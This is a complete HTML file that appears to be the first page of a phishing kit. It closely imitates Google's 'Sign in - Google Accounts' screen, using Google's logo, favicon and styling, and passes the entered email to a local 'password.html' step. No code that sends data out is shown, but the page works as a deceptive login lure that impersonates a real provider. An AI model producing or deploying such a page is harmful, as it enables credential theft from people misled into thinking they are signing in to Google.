<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    background: #fff; color: #202124;
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; padding: 20px;
  }
  .container {
    width: 100%; max-width: 448px;
    border: 1px solid #dadce0; border-radius: 8px;
    padding: 48px 40px 36px; background: #fff;
  }
  .logo { display: flex; justify-content: center; margin-bottom: 16px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
  .subtitle { font-size: 16px; text-align: center; margin-bottom: 32px; }
  .input-group { position: relative; margin-bottom: 24px; }
  .input-group input {
    width: 100%; padding: 13px 15px; font-size: 16px;
    border: 1px solid #dadce0; border-radius: 4px; outline: none;
  }
  .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
  .input-group label {
    position: absolute; top: -8px; left: 12px;
    background: #fff; padding: 0 4px; font-size: 12px; color: #5f6368;
  }
  .forgot { display: inline-block; color: #1a73e8; font-size: 14px;
            font-weight: 500; text-decoration: none; margin-bottom: 32px; }
  .info-text { font-size: 14px; color: #5f6368; margin-bottom: 32px; line-height: 1.5; }
  .info-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
  .actions { display: flex; justify-content: space-between; align-items: center; }
  .actions a { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
  .btn-next { background: #1a73e8; color: #fff; border: none;
              padding: 10px 24px; border-radius: 4px; font-size: 14px;
              font-weight: 500; cursor: pointer; }
  .btn-next:hover { background: #1557b0; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg width="48" height="48" viewBox="0 0 48 48">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
  </div>
  <h1>Sign in</h1>
  <p class="subtitle">Use your Google Account</p>
  <form action="password.html" method="get">
    <div class="input-group">
      <input type="email" name="email" id="email" required autocomplete="username">
      <label for="email">Email or phone</label>
    </div>
    <a href="#" class="forgot">Forgot email?</a>
    <p class="info-text">
      Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
    </p>
    <div class="actions">
      <a href="#">Create account</a>
      <button type="submit" class="btn-next">Next</button>
    </div>
  </form>
</div>
<script>
  document.getElementById('email').focus();
</script>
</body>
</html>
